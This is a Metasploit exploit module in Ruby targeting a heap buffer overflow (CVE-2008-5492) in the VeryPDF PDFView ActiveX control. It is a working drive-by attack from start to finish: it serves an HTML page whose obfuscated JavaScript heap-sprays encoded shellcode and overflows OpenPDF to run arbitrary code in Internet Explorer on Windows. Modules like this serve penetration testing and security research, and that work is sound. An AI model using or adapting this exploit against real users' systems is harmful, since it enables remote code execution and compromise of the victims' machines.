##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VeryPDF PDFView OCX ActiveX OpenPDF Heap Overflow',
      'Description'    => %q{
          The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow
        because it fails to properly bounds-check user-supplied data before copying
        it into an insufficiently sized memory buffer. An attacker can exploit this issue
        to execute arbitrary code within the context of the affected application.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC', 'dean <dean[at]zerodaysolutions.com>' ],
      'References'     =>
        [
          [ 'CVE', '2008-5492'],
          [ 'OSVDB', '49871'],
          [ 'BID','32313' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'         => 1024,
          'BadChars'      => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0c0c0c0c } ]
        ],
      'DisclosureDate' => '2008-06-16',
      'DefaultTarget'  => 0))
  end

  def autofilter
    false
  end

  def check_dependencies
    use_zlib
  end

  def on_request_uri(cli, request)
    # Re-generate the payload.
    return if ((p = regenerate_payload(cli)) == nil)

    # Encode the shellcode.
    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

    # Create some nops.
    nops    = Rex::Text.to_unescape(make_nops(4))

    # Set the return.
    ret    = Rex::Text.uri_encode([target.ret].pack('L'))

    # Randomize the javascript variable names.
    vname  = rand_text_alpha(rand(100) + 1)
    var_i  = rand_text_alpha(rand(30)  + 2)
    rand1  = rand_text_alpha(rand(100) + 1)
    rand2  = rand_text_alpha(rand(100) + 1)
    rand3  = rand_text_alpha(rand(100) + 1)
    rand4  = rand_text_alpha(rand(100) + 1)
    rand5  = rand_text_alpha(rand(100) + 1)
    rand6  = rand_text_alpha(rand(100) + 1)
    rand7  = rand_text_alpha(rand(100) + 1)
    rand8  = rand_text_alpha(rand(100) + 1)

    content = %Q|
      <html>
        <object id='#{vname}' classid='clsid:433268D7-2CD4-43E6-AA24-2188672E7252'></object>
        <script language="JavaScript">
        var #{rand1} = unescape('#{shellcode}');
        var #{rand2} = unescape('#{ret}');
        var #{rand3} = 20;
        var #{rand4} = #{rand3} + #{rand1}.length;
        while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
        var #{rand5} = #{rand2}.substring(0,#{rand4});
        var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
        while (#{rand6}.length + #{rand4} < 0x10000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
        var #{rand7} = new Array();
        for (#{var_i} = 0; #{var_i} < 1000; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
        var #{rand8} = "";
        for (#{var_i} = 0; #{var_i} < 7024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
        #{vname}.OpenPDF(#{rand8}, 1, 1);
        </script>
      </html>
      |

    print_status("Sending #{self.name}")

    # Transmit the response to the client
    send_response_html(cli, content)

    # Handle the payload
    handler(cli)
  end
end
